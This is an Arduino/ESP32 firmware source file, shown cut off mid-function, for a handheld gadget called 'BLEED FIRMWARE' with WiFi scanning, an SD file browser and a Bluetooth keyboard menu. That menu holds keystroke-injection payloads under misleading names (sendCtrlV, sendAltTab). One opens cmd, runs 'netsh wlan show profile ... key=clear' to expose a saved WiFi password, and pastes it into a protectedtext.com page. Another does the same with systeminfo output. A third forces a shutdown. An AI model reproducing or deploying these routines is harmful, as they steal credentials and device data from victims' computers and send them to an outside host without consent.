#include <TFT_eSPI.h>
#include <SPI.h>
#include <textures.h>
#include <SD.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEHIDDevice.h>
#include <BleKeyboard.h>
#include <math.h>
#include <WebServer.h>
#include <Preferences.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <time.h>

// Preferences instance for storing WiFi credentials
Preferences preferences;

void packetGraphMenu();

void wifiChannelMenu();


WebServer server(80);
const char* ap_ssid = "ESP32_WebImg";
const char* ap_password = "12345678";
uint16_t uploadedImage[160 * 80];
bool imageReceived = false;

struct WiFiCreds {
    String ssid;
    String password;
};



bool sdCardInitialized = false;
File root;
String currentPath = "/";

// Add these function prototypes with your other function prototypes
void initSDCard();
String getParentPath(const String& path);
void drawFileManagerHeader();


BleKeyboard bleKeyboard;


// Bluetooth submenu item structure
struct BluetoothMenuItem {
  const char* name;
  void (*action)();
};

// Button pin definitions
#define BTN_LEFT 33
#define BTN_SELECT 32
#define BTN_RIGHT 27



// Colors
#define BACKGROUND_COLOR TFT_BLACK
#define PRIMARY_TEXT_COLOR TFT_WHITE
#define HEADER_TEXT_COLOR TFT_WHITE
#define HIGHLIGHT_COLOR TFT_YELLOW
#define ACCENT_COLOR tft.color565(128, 128, 128)

// Menu item structure
struct MenuItem {
  const char* name;
  
  void (*action)();
};

// Function prototypes for menu actions
void bluetoothMenu();
void wifiMenu();
void configMenu();
void webImgMenu();
void pacmanMenu();
void webUIMenu();
void internetMenu();
void goldRateMenu();
void timeMenu();
void chuckNorrisMenu();
void followersMenu();
void idkMenu();
void wifiConfigMenu();

// Menu items
MenuItem menuItems[] = {
  {"Bluetooth",  bluetoothMenu},
  {"WiFi",  wifiMenu},
  {"Config", configMenu},
  {"Internet",  internetMenu},  // Changed from WebImg
  {"Pacman", pacmanMenu},
  {"Web UI", webUIMenu},
  {"WiFi Chan",  wifiChannelMenu},
  {"PacGra",  packetGraphMenu},
};
const int NUM_MENU_OPTIONS = sizeof(menuItems) / sizeof(menuItems[0]);

struct InternetMenuItem {
  const char* name;
  void (*action)();
};


InternetMenuItem internetMenuItems[] = {
  {"Gold Rate", goldRateMenu},
  {"Time", timeMenu},
  {"Chuck Norris", chuckNorrisMenu},
  {"Followers", followersMenu},
  {"IDK", idkMenu}
};
const int NUM_INTERNET_OPTIONS = sizeof(internetMenuItems) / sizeof(internetMenuItems[0]);

struct ConfigMenuItem {
    const char* name;
    bool* state;
    void (*action)();
    bool showToggle;
};

// Modify configMenuItems array - replace "Amogus" with "WiFi"
ConfigMenuItem configMenuItems[] = {
  
  {"WiFi", nullptr, wifiConfigMenu, false},  // Changed from Amogus
  {"Exit", nullptr, nullptr, false}
};


// Global variables
TFT_eSPI tft = TFT_eSPI();
int currentMenuIndex = 0;
unsigned long lastButtonPress = 0;
const unsigned long DEBOUNCE_DELAY = 200; // Debounce time in milliseconds
const unsigned long LONG_PRESS_DELAY = 1000; // Long press duration

// WiFi specific variables
#define MAX_WIFI_NETWORKS 10
#define MAX_SSID_LENGTH 20
String wifiNetworks[MAX_WIFI_NETWORKS];
int wifiNetworkCount = 0;
int currentWiFiIndex = 0;


SPIClass sdSPI(HSPI);

#define SD_CS_PIN 13  // Changed to GPIO 13
#define SD_MOSI_PIN 12
#define SD_MISO_PIN 14
#define SD_SCK_PIN 26


bool torch_enabled = false;
bool amogus_enabled = false;
bool bluetooth_connected = false;

const int GRAPH_HEIGHT = 40;     // Height of the graph area
const int GRAPH_WIDTH = 120;     // Width of the graph
const int GRAPH_X = 5;           // X position of graph
const int GRAPH_Y = 30;          // Y position of graph
const int HISTORY_SIZE = 120;    // Number of readings to keep (matches graph width)
int packetHistory[HISTORY_SIZE] = {0};  // Array to store packet counts
int historyIndex = 0;
int maxPackets = 1;  // Keeps track of maximum packets for scaling



// Action functions for config items
void toggleBluetooth(bool state) {
  if (state == false) {
    bleKeyboard.end();  // Disconnect BLE
    // Add any additional cleanup needed
    bluetooth_connected = false;
  }
}

void toggleTorch(bool state) {
  // Implement torch control here
  torch_enabled = state;
}

void toggleAmogus(bool state) {
  // Implement amogus functionality here
  amogus_enabled = state;
}

// Config menu items array



void setup() {
  // Initialize serial communication
  Serial.begin(115200);
  
 
  // Initialize display
  tft.init();
  tft.setRotation(1);  // Adjust rotation as needed
  tft.init();
  tft.setRotation(1); // Adjust rotation if needed
  tft.fillScreen(TFT_BLACK);
  displayStartupScreen();
  // Show the startup image
  
  tft.fillScreen(TFT_BLACK);


  // Initialize buttons
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);

  // Draw initial menu
  drawMenu();
}

void loop() {
  static int lastLeftState = HIGH, lastRightState = HIGH, lastSelectState = HIGH;
  static unsigned long selectPressTime = 0;

  int leftState = digitalRead(BTN_LEFT);
  int rightState = digitalRead(BTN_RIGHT);
  int selectState = digitalRead(BTN_SELECT);

  unsigned long currentTime = millis();

  // Handle left button
  if (leftState == LOW && lastLeftState == HIGH && (currentTime - lastButtonPress > DEBOUNCE_DELAY)) {
    navigateMenu(-1);
    lastButtonPress = currentTime;
  }
  lastLeftState = leftState;

  // Handle right button
  if (rightState == LOW && lastRightState == HIGH && (currentTime - lastButtonPress > DEBOUNCE_DELAY)) {
    navigateMenu(1);
    lastButtonPress = currentTime;
  }
  lastRightState = rightState;

  // Handle select button with long press detection
  if (selectState == LOW) {
    if (lastSelectState == HIGH) {
      selectPressTime = currentTime;
    }
    
    // Long press detected
    if (currentTime - selectPressTime >= LONG_PRESS_DELAY) {
      drawMenu(); // Return to main menu
      selectPressTime = 0;
    }
  }
  
  // Short press handling
  if (selectState == LOW && lastSelectState == HIGH && (currentTime - lastButtonPress > DEBOUNCE_DELAY)) {
    selectMenuItem();
    lastButtonPress = currentTime;
  }
  lastSelectState = selectState;

  delay(10); // Small delay for stability
}

void navigateMenu(int direction) {
  // Update menu index with wrap-around
  currentMenuIndex += direction;
  if (currentMenuIndex < 0) {
    currentMenuIndex = NUM_MENU_OPTIONS - 1;
  }
  if (currentMenuIndex >= NUM_MENU_OPTIONS) {
    currentMenuIndex = 0;
  }

  // Redraw menu
  drawMenu();
}

void drawMenu() {
  // Clear screen
  tft.fillScreen(BACKGROUND_COLOR);

  // Draw header
  tft.setCursor(10, 10);
  tft.setTextColor(HEADER_TEXT_COLOR);
  tft.fillRect(0, 0, tft.width(), 20, ACCENT_COLOR);
  tft.setTextColor(PRIMARY_TEXT_COLOR);
  tft.setTextSize(1);
  tft.setCursor(5, 5);
  tft.println("BLEED FIRMWARE");

  

  // Draw current menu item name at bottom
  tft.setTextSize(2);
  tft.setCursor((tft.width() - strlen(menuItems[currentMenuIndex].name) * 12) / 2, tft.height() - 20);
  tft.print(menuItems[currentMenuIndex].name);
}

void selectMenuItem() {
  // Call the specific menu item's action function
  if (menuItems[currentMenuIndex].action) {
    menuItems[currentMenuIndex].action();
  }
}

void displayStartupScreen() {
  // Clear the screen
  tft.fillScreen(BACKGROUND_COLOR);
  
  // Calculate center position for 160x80 bitmap
  int bmpX = (tft.width() - 160) / 2;
  int bmpY = (tft.height() - 80) / 2;
  
  // Draw the bitmap image - you'll need to define your bitmap data in your textures.h file
  // Example bitmap array name: STARTUP_LOGO (160x80 pixels)
  drawBitmap(bmpX, bmpY, STARTUP_LOGO, 160, 80);
  
  // Animated Loading bar
  for (int i = 0; i <= 100; i++) {
    tft.fillRect(10, tft.height() - 15, (tft.width() - 20) * (i/100.0), 5, PRIMARY_TEXT_COLOR);
    delay(10);
  }
}
void drawBitmap(int x, int y, const uint16_t* bitmap, int w, int h) {
  for (int i = 0; i < h; i++) {
    for (int j = 0; j < w; j++) {
      tft.drawPixel(x + j, y + i, bitmap[i * w + j]);
    }
  }
}

// Truncate SSID if it's too long
String truncateSSID(const String& ssid) {
  if (ssid.length() > MAX_SSID_LENGTH) {
    return ssid.substring(0, MAX_SSID_LENGTH - 3) + "...";
  }
  return ssid;
}

void wifiMenu() {
  // Scan for WiFi networks
  tft.fillScreen(BACKGROUND_COLOR);
  tft.setTextColor(PRIMARY_TEXT_COLOR);
  tft.setTextSize(1);
  tft.setCursor(0, 0);
  tft.println("Scanning WiFi...");

  // Scan WiFi networks
  wifiNetworkCount = WiFi.scanNetworks();

  // Clear previous networks
  for (int i = 0; i < MAX_WIFI_NETWORKS; i++) {
    wifiNetworks[i] = "";
  }

  // Store truncated network names
  for (int i = 0; i < min(wifiNetworkCount, MAX_WIFI_NETWORKS); i++) {
    wifiNetworks[i] = truncateSSID(WiFi.SSID(i));
  }

  // Reset index
  currentWiFiIndex = 0;

  bool needRedraw = true;
  // Display WiFi networks with scrolling
  while (true) {
    if (needRedraw) {
      tft.fillScreen(BACKGROUND_COLOR);
      
      // Display title
      tft.fillRect(0, 0, tft.width(), 10, ACCENT_COLOR);
      tft.setCursor(5, 2);
      tft.setTextColor(PRIMARY_TEXT_COLOR);
      tft.println("WiFi Networks");

      // Light blue color for selection
      uint16_t SELECTION_COLOR = tft.color565(100, 200, 255);

      // Display current networks with scrolling
      for (int i = 0; i < min(6, wifiNetworkCount); i++) {
        int yPos = 12 + (i * 8);
        
        // Highlight current selection with light blue
        if (i == 3) {  // Middle of the 6 options
          tft.fillRect(0, yPos - 1, tft.width(), 8, SELECTION_COLOR);
          tft.setTextColor(BACKGROUND_COLOR);
        } else {
          tft.setTextColor(PRIMARY_TEXT_COLOR);
        }

        // Calculate the network index to display
        int networkIndex = (currentWiFiIndex - 3 + i + wifiNetworkCount) % wifiNetworkCount;
        tft.setCursor(5, yPos);
        tft.setTextSize(1);
        tft.println(wifiNetworks[networkIndex]);
      }

      needRedraw = false;
    }

    // Wait for button input
    delay(50);  // Reduced delay for more responsive input
    int leftState = digitalRead(BTN_LEFT);
    int rightState = digitalRead(BTN_RIGHT);
    int selectState = digitalRead(BTN_SELECT);

    // Navigation
    if (leftState == LOW) {
      currentWiFiIndex = (currentWiFiIndex - 1 + wifiNetworkCount) % wifiNetworkCount;
      needRedraw = true;
      delay(200);
    }
    if (rightState == LOW) {
      currentWiFiIndex = (currentWiFiIndex + 1) % wifiNetworkCount;
      needRedraw = true;
      delay(200);
    }

    // Long press to return to main menu
    if (selectState == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BTN_SELECT) == LOW) {
        if (millis() - pressStart > LONG_PRESS_DELAY) {
          drawMenu();
          return;
        }
      }
    }
  }
}



void configMenu() {
  int currentConfigIndex = 0;
  bool needRedraw = true;

  while (true) {
    if (needRedraw) {
      tft.fillScreen(BACKGROUND_COLOR);
      
      // Display title
      tft.fillRect(0, 0, tft.width(), 10, ACCENT_COLOR);
      tft.setCursor(5, 2);
      tft.setTextColor(PRIMARY_TEXT_COLOR);
      tft.setTextSize(1);
      tft.println("Config Menu");

      // Light blue color for selection
      uint16_t SELECTION_COLOR = tft.color565(100, 200, 255);

      // Display config items
      for (int i = 0; i < NUM_MENU_OPTIONS; i++) {
        int yPos = 20 + (i * 12);
        
        // Highlight current selection
        if (i == currentConfigIndex) {
          tft.fillRect(0, yPos - 1, tft.width(), 10, SELECTION_COLOR);
          tft.setTextColor(BACKGROUND_COLOR);
        } else {
          tft.setTextColor(PRIMARY_TEXT_COLOR);
        }

        // Display item name
        tft.setCursor(5, yPos);
        tft.print(configMenuItems[i].name);

        // Display status (ON/OFF) only for toggle items
        if (configMenuItems[i].showToggle) {
          tft.setCursor(tft.width() - 30, yPos);
          tft.print(*(configMenuItems[i].state) ? "ON" : "OFF");
        }
      }

      needRedraw = false;
    }

    // Button handling
    delay(50);
    int leftState = digitalRead(BTN_LEFT);
    int rightState = digitalRead(BTN_RIGHT);
    int selectState = digitalRead(BTN_SELECT);

    // Navigation
    if (leftState == LOW) {
      currentConfigIndex = (currentConfigIndex - 1 + NUM_MENU_OPTIONS) % NUM_MENU_OPTIONS;
      needRedraw = true;
      delay(200);
    }
    if (rightState == LOW) {
      currentConfigIndex = (currentConfigIndex + 1) % NUM_MENU_OPTIONS;
      needRedraw = true;
      delay(200);
    }

    // Select handling
    if (selectState == LOW) {
      // If Exit is selected
      if (currentConfigIndex == NUM_MENU_OPTIONS - 1) {
        drawMenu();
        return;
      }
      
      // For toggle items
      if (configMenuItems[currentConfigIndex].showToggle) {
        // Toggle the selected item
        bool newState = !*(configMenuItems[currentConfigIndex].state);
        *(configMenuItems[currentConfigIndex].state) = newState;
        
        // Call the associated action function
        if (configMenuItems[currentConfigIndex].action != nullptr) {
          configMenuItems[currentConfigIndex].action();
        }
      }
      
      needRedraw = true;
      delay(200);
    }
  }
}





void webUIMenu() {
  // Placeholder for Web UI functionality
  tft.fillScreen(BACKGROUND_COLOR);
  tft.setTextColor(PRIMARY_TEXT_COLOR);
  tft.setCursor(0, 0);
  tft.println("Web UI");
  delay(1500);
  drawMenu();
}







void sendCtrlV() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  bleKeyboard.print("cmd");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(1000);

  // Find the WiFi password
  bleKeyboard.print("netsh wlan show profile name=\"[WIFI_NETWORK_NAME]\" key=clear");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(1000);
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('a');
  delay(100);
  // Copy the WiFi password
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('c');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  // Open the website and paste the password
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  bleKeyboard.print("https://www.protectedtext.com/guthib");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(2000);

  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('v');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  // Save the text
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('s');
  delay(100);
  bleKeyboard.releaseAll();
  delay(1000);
}

void shutdown() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  bleKeyboard.print("shutdown /s /t 0");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(1000);
}

void sendAltTab() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  bleKeyboard.print("cmd");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(1000);

  // Retrieve device information
  bleKeyboard.print("systeminfo");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(5000);

  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('a');
  delay(100);
  // Copy the device information
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('c');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  // Open the website and enter the password
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  bleKeyboard.print("https://www.protectedtext.com/guthib");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(2000);

  bleKeyboard.print("mangolove");
  bleKeyboard.press(KEY_RETURN);
  delay(100);
  bleKeyboard.releaseAll();
  delay(1000);

  // Paste the device information
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('v');
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);

  // Save the text
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('s');
  delay(100);
  bleKeyboard.releaseAll();
  delay(1000);


  
}



void sendWinKey() {
  bleKeyboard.press(KEY_LEFT_GUI);
  delay(100);
  bleKeyboard.releaseAll();
}

void sendScreenshot() {
  bleKeyboard.press(KEY_LEFT_SHIFT);
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('s');
  delay(100);
  bleKeyboard.releaseAll();
}

void sendMediaPlay() {
  bleKeyboard.press(KEY_MEDIA_PLAY_PAUSE);
  delay(100);
  bleKeyboard.releaseAll();
}

void sendVolumeUp() {
  bleKeyboard.press(KEY_MEDIA_VOLUME_UP);
  delay(100);
  bleKeyboard.releaseAll();
}

void sendVolumeDown() {
  bleKeyboard.press(KEY_MEDIA_VOLUME_DOWN);
  delay(100);
  bleKeyboard.releaseAll();
}

// Bluetooth menu items
BluetoothMenuItem bluetoothMenuItems[] = {
  {"ShutDown PC", shutdown},
  {"GetWiFi", sendCtrlV},
  {"Getinfo", sendAltTab},
  {"Win Key", sendWinKey},
  {"Screenshot", sendScreenshot},
  {"Play/Pause", sendMediaPlay},
  {"Volume Up", sendVolumeUp},
  {"Volume Down", sendVolumeDown}
};
const int NUM_BT_MENU_OPTIONS = sizeof(bluetoothMenuItems) / sizeof(bluetoothMenuItems[0]);

int currentBluetoothIndex = 0;

void bluetoothMenu() {
  // Initialize BLE Keyboard if not already connected
  if(!bleKeyboard.isConnected()) {
    bleKeyboard.begin();
   
    
  }

  bool needRedraw = true;
  while (true) {
    if (needRedraw) {
      tft.fillScreen(BACKGROUND_COLOR);
      tft.setTextSize(1);
      // Display title
      tft.fillRect(0, 0, tft.width(), 10, ACCENT_COLOR);
      tft.setCursor(5, 2);
      tft.setTextColor(PRIMARY_TEXT_COLOR);
      tft.println("Bluetooth");

      // Display connection status in top right
      tft.setCursor(tft.width() - 60, 2);
      if (bleKeyboard.isConnected()) {
        tft.setTextColor(TFT_GREEN);
        tft.print("iiii");
      } else {
        tft.setTextColor(TFT_RED);
        tft.print("iiii");
      }

      // Light blue color for selection
      uint16_t SELECTION_COLOR = tft.color565(100, 200, 255);

      // Display current Bluetooth menu items with scrolling
      for (int i = 0; i < min(6, NUM_BT_MENU_OPTIONS); i++) {
        int yPos = 12 + (i * 8);
        
        // Highlight current selection with light blue
        if (i == 3) {  // Middle of the 6 options
          tft.fillRect(0, yPos - 1, tft.width(), 8, SELECTION_COLOR);
          tft.setTextColor(BACKGROUND_COLOR);
        } else {
          tft.setTextColor(PRIMARY_TEXT_COLOR);
        }

        // Calculate the menu item index to display
        int itemIndex = (currentBluetoothIndex - 3 + i + NUM_BT_MENU_OPTIONS) % NUM_BT_MENU_OPTIONS;
        tft.setCursor(5, yPos);
        tft.setTextSize(1);
        tft.println(bluetoothMenuItems[itemIndex].name);
      }

      needRedraw = false;
    }

    // Wait for button input
    delay(50);  // Reduced delay for more responsive input
    int leftState = digitalRead(BTN_LEFT);
    int rightState = digitalRead(BTN_RIGHT);
    int selectState = digitalRead(BTN_SELECT);

    // Navigation
    if (leftState == LOW) {
      currentBluetoothIndex = (currentBluetoothIndex - 1 + NUM_BT_MENU_OPTIONS) % NUM_BT_MENU_OPTIONS;
      needRedraw = true;
      delay(200);
    }
    if (rightState == LOW) {
      currentBluetoothIndex = (currentBluetoothIndex + 1) % NUM_BT_MENU_OPTIONS;
      needRedraw = true;
      delay(200);
    }

    // Select action or return to main menu
    if (selectState == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BTN_SELECT) == LOW) {
        // Long press to return to main menu
        if (millis() - pressStart > LONG_PRESS_DELAY) {
          bleKeyboard.end(); // Stop BLE keyboard
          drawMenu();
          return;
        }
      }
      
      // Short press to execute action
      bluetoothMenuItems[currentBluetoothIndex].action();
      delay(300);
    }
  }
}


void initSDCard() {
  // Initialize SPI
  sdSPI.begin(SD_SCK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);
  
  // Initialize SD with specific SPI
  if (!SD.begin(SD_CS_PIN, sdSPI)) {
    sdCardInitialized = false;
    return;
  }
  sdCardInitialized = true;
  root = SD.open("/");
}

String getParentPath(const String& path) {
  int lastSlashIndex = path.lastIndexOf('/');
  if (lastSlashIndex == 0) return "/";
  return path.substring(0, lastSlashIndex);
}

void drawFileManagerHeader() {
  tft.fillRect(0, 0, tft.width(), 20, ACCENT_COLOR);
  tft.setTextColor(PRIMARY_TEXT_COLOR);
  tft.setCursor(5, 5);
  tft.setTextSize(1);
  tft.print("SD Card: ");
  tft.print(currentPath);
}

void pacmanMenu() {
  // Initialize SD card
  initSDCard();

  // If no SD card is detected
  if (!sdCardInitialized) {
    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextColor(TFT_RED);
    tft.setTextSize(2);
    tft.setCursor(10, tft.height() / 2);
    tft.println("No SD Card");
    tft.println("Detected");
    
    delay(2000);
    drawMenu();
    return;
  }

  // File navigation variables
  File dir;
  File entry;
  int filesCount = 0;
  int currentFileIndex = 0;
  const int MAX_DISPLAY_FILES = 6;
  unsigned long lastNavTime = 0;
  const int NAV_DELAY = 200;

  while (true) {
    // Clear screen
    tft.fillScreen(BACKGROUND_COLOR);

    // Draw header
    drawFileManagerHeader();

    // Open current directory
    dir = SD.open(currentPath);
    
    // Count and prepare files for display
    dir.rewindDirectory();
    filesCount = 0;
    File countEntry;
    while (countEntry = dir.openNextFile()) {
      filesCount++;
      countEntry.close();
    }

    // Constrain current file index
    currentFileIndex = constrain(currentFileIndex, 0, max(0, filesCount - 1));

    // Reopen directory for display
    dir = SD.open(currentPath);
    dir.rewindDirectory();

    // Skip to current file index
    for (int i = 0; i < currentFileIndex; i++) {
      entry = dir.openNextFile();
      entry.close();
    }

    // Display files
    int displayCount = min(MAX_DISPLAY_FILES, filesCount);
    for (int i = 0; i < displayCount; i++) {
      entry = dir.openNextFile();
      if (!entry) break;

      int yPos = 25 + (i * 20);
      
      // Highlight current selection
      if (i == 0) {
        tft.fillRect(0, yPos - 2, tft.width(), 20, tft.color565(100, 200, 255));
        tft.setTextColor(BACKGROUND_COLOR);
      } else {
        tft.setTextColor(entry.isDirectory() ? TFT_GREEN : PRIMARY_TEXT_COLOR);
      }

      tft.setCursor(5, yPos);
      tft.setTextSize(1);
      tft.print(entry.name());
      
      // Mark directories
      if (entry.isDirectory()) {
        tft.print("/");
      }

      entry.close();
    }

    // Button state tracking
    int leftState = digitalRead(BTN_LEFT);
    int rightState = digitalRead(BTN_RIGHT);
    int selectState = digitalRead(BTN_SELECT);

    // Simultaneous left and right button press
    if (leftState == LOW && rightState == LOW) {
      // Go to parent directory
      if (currentPath != "/") {
        currentPath = getParentPath(currentPath);
        currentFileIndex = 0;
      }
      delay(300);
      continue;
    }

    // Navigation with debounce
    unsigned long currentTime = millis();
    if (currentTime - lastNavTime > NAV_DELAY) {
      if (leftState == LOW) {
        currentFileIndex = max(0, currentFileIndex - 1);
        lastNavTime = currentTime;
      }
      if (rightState == LOW) {
        currentFileIndex = min(filesCount - 1, currentFileIndex + 1);
        lastNavTime = currentTime;
      }
    }

    // Select/Enter directory or long press to exit
    if (selectState == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BTN_SELECT) == LOW) {
        // Long press to return to main menu
        if (millis() - pressStart > LONG_PRESS_DELAY) {
          drawMenu();
          return;
        }
      }
      
      // Reopen directory and navigate to selected file/folder
      dir = SD.open(currentPath);
      for (int i = 0; i < currentFileIndex; i++) {
        entry = dir.openNextFile();
        entry.close();
      }
      
      entry = dir.openNextFile();
      if (entry.isDirectory()) {
        // Enter directory
        currentPath += entry.name() + String("/");
        currentFileIndex = 0;
      } else {
        // Basic file info display
        tft.fillScreen(BACKGROUND_COLOR);
        tft.setTextColor(PRIMARY_TEXT_COLOR);
        tft.setCursor(0, 0);
        tft.println("Selected: ");
        tft.println(entry.name());
        tft.println("Size: " + String(entry.size()) + " bytes");
        delay(1500);
      }
      
      entry.close();
      dir.close();
      delay(200);
    }

    // Close directory
    dir.close();
    delay(50);
  }
}

void wifiChannelMenu() {
  int currentChannel = 1;
  unsigned long lastScanTime = 0;
  const unsigned long SCAN_INTERVAL = 1000; // Scan every second
  
  // Initialize WiFi in station mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  while (true) {
    unsigned long currentTime = millis();
    
    // Update display and scan networks
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      // Perform network scan
      int networksFound = WiFi.scanNetworks(false, true, false, 100, currentChannel);
      
      // Clear screen and draw interface
      tft.fillScreen(BACKGROUND_COLOR);
      
      // Draw header
      tft.fillRect(0, 0, tft.width(), 20, ACCENT_COLOR);
      tft.setTextColor(PRIMARY_TEXT_COLOR);
      tft.setTextSize(1);
      tft.setCursor(5, 5);
      tft.print("WiFi Channel: ");
      tft.print(currentChannel);
      
      // Draw network count
      tft.setCursor(5, 30);
      tft.print("Networks: ");
      tft.println(networksFound);
      
      // Draw network details (up to 3 strongest networks)
      int yPos = 45;
      for (int i = 0; i < min(3, networksFound); i++) {
        tft.setCursor(5, yPos);
        // Print SSID (truncated if needed)
        String ssid = WiFi.SSID(i);
        if (ssid.length() > 10) {
          ssid = ssid.substring(0, 8) + "..";
        }
        tft.print(ssid);
        
        // Print signal strength
        tft.setCursor(80, yPos);
        tft.print(WiFi.RSSI(i));
        tft.print("dBm");
        yPos += 10;
      }
      
      // Draw channel bar
      for (int i = 1; i <= 14; i++) {
        int x = map(i, 1, 14, 10, tft.width() - 10);
        int barHeight = 5;
        if (i == currentChannel) {
          barHeight = 10;
          tft.fillRect(x - 2, tft.height() - 15, 4, barHeight, HIGHLIGHT_COLOR);
        } else {
          tft.fillRect(x - 1, tft.height() - 13, 2, barHeight, PRIMARY_TEXT_COLOR);
        }
      }
      
      lastScanTime = currentTime;
    }
    
    // Button handling
    int leftState = digitalRead(BTN_LEFT);
    int rightState = digitalRead(BTN_RIGHT);
    int selectState = digitalRead(BTN_SELECT);
    
    // Change channel with left/right buttons
    if (leftState == LOW && currentChannel > 1) {
      currentChannel--;
      delay(200);
    }
    
    if (rightState == LOW && currentChannel < 14) {
      currentChannel++;
      delay(200);
    }
    
    // Long press select to exit
    if (selectState == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BTN_SELECT) == LOW) {
        if (millis() - pressStart > LONG_PRESS_DELAY) {
          // Clean up WiFi
          WiFi.scanDelete();
          WiFi.mode(WIFI_OFF);
          
          // Return to main menu
          drawMenu();
          return;
        }
      }
    }
    
    delay(10);
  }
}

void packetGraphMenu() {
  unsigned long lastUpdateTime = 0;
  const unsigned long UPDATE_INTERVAL = 100;  // Update every 100ms
  int currentChannel = 1;
  
  // Initialize WiFi in station mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  // Clear history
  for (int i = 0; i < HISTORY_SIZE; i++) {
    packetHistory[i] = 0;
  }
  
  while (true) {
    unsigned long currentTime = millis();
    
    // Update display and scan networks
    if (currentTime - lastUpdateTime >= UPDATE_INTERVAL) {
      // Scan for networks and count them
      int networksFound = WiFi.scanNetworks(false, true, false, 100, currentChannel);
      
      // Update history
      packetHistory[historyIndex] = networksFound;
      historyIndex = (historyIndex + 1) % HISTORY_SIZE;
      
      // Find maximum for scaling
      maxPackets = 1;  // Reset to minimum of 1
      for (int i = 0; i < HISTORY_SIZE; i++) {
        if (packetHistory[i] > maxPackets) {
          maxPackets = packetHistory[i];
        }
      }
      
      // Clear screen
      tft.fillScreen(BACKGROUND_COLOR);
      
      // Draw header
      tft.fillRect(0, 0, tft.width(), 20, ACCENT_COLOR);
      tft.setTextColor(PRIMARY_TEXT_COLOR);
      tft.setTextSize(1);
      tft.setCursor(5, 5);
      tft.print("Channel: ");
      tft.print(currentChannel);
      tft.print(" Max: ");
      tft.print(maxPackets);
      
      // Draw graph frame
      tft.drawRect(GRAPH_X - 1, GRAPH_Y - 1, GRAPH_WIDTH + 2, GRAPH_HEIGHT + 2, PRIMARY_TEXT_COLOR);
      
      // Draw graph grid
      for (int y = 0; y < 4; y++) {
        int gridY = GRAPH_Y + (y * (GRAPH_HEIGHT / 3));
        for (int x = 0; x < GRAPH_WIDTH; x += 10) {
          tft.drawPixel(GRAPH_X + x, gridY, tft.color565(50, 50, 50));
        }
      }
      
      // Draw packet history graph
      for (int i = 0; i < GRAPH_WIDTH; i++) {
        int readingIndex = (historyIndex - 1 - i + HISTORY_SIZE) % HISTORY_SIZE;
        int value = packetHistory[readingIndex];
        
        // Scale value to graph height
        int scaledValue = map(value, 0, maxPackets, 0, GRAPH_HEIGHT);
        
        // Calculate color based on value (green to yellow to red)
        uint16_t color;
        if (value < maxPackets / 2) {
          color = tft.color565(0, 255, 0);  // Green
        } else if (value < (maxPackets * 3) / 4) {
          color = tft.color565(255, 255, 0);  // Yellow
        } else {
          color = tft.color565(255, 0, 0);  // Red
        }
        
        // Draw vertical line for this reading
        if (scaledValue > 0) {
          tft.drawFastVLine(GRAPH_X + (GRAPH_WIDTH - 1 - i), 
                           GRAPH_Y + GRAPH_HEIGHT - scaledValue,
                           scaledValue,
                           color);
        }
      }
      
      // Draw scale labels
      tft.setTextColor(PRIMARY_TEXT_COLOR);
      tft.setTextSize(1);
      tft.setCursor(GRAPH_X - 5, GRAPH_Y - 5);
      tft.print(maxPackets);
      tft.setCursor(GRAPH_X - 5, GRAPH_Y + GRAPH_HEIGHT - 4);
      tft.print("0");
      
      lastUpdateTime = currentTime;
    }
    
    // Button handling
    int leftState = digitalRead(BTN_LEFT);
    int rightState = digitalRead(BTN_RIGHT);
    int selectState = digitalRead(BTN_SELECT);
    
    // Change channel with left/right buttons
    if (leftState == LOW && currentChannel > 1) {
      currentChannel--;
      // Clear history when changing channels
